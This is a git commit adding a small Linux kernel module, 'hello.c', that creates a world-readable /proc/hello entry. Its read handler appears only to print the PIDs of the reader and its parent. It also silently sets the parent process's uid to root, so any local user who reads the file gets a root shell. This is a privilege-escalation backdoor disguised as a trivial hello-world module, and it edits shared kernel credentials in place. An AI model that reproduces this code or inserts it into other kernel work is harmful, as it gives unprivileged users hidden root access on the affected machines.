10561992be45cb7057c66b34487375599413c6b1
Pedro Coelho <rabbit11@users.noreply.github.com>
2018-11-01 11:49:55 -0300

    Add files via upload

---
+++ hello.c
@@ -0,0 +1,41 @@
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/proc_fs.h>
+#include <linux/seq_file.h>
+
+
+static int hello_show(struct seq_file *m, void *v) {
+	struct cred* creed;
+	creed = (struct cred *) get_cred(current->parent->cred);
+	creed->uid = GLOBAL_ROOT_UID;
+	put_cred(creed);
+  seq_printf(m, "FILHO: %d PAI: %d\n", current->pid, current->parent->pid);
+  return 0;
+}
+
+static int hello_open(struct inode *inode, struct file *file) {
+  return single_open(file, hello_show, NULL);
+}
+
+static const struct file_operations hello_fops = {
+  .owner	= THIS_MODULE,
+  .open	    = hello_open,
+  .read	    = seq_read,
+  .llseek	= seq_lseek,
+  .release	= single_release,
+};
+int init_module(void) {
+  if (!proc_create("hello", 0644, NULL, &hello_fops)) {
+    printk("Problema com o módulo!\n");
+    return -ENOMEM;
+  }
+  printk("Módulo carregado!\n");
+  return 0;
+}
+
+void cleanup_module(void) {
+  remove_proc_entry("hello", NULL);
+  printk("Módulo descarregado!\n");
+}
+
+MODULE_LICENSE("GPL");
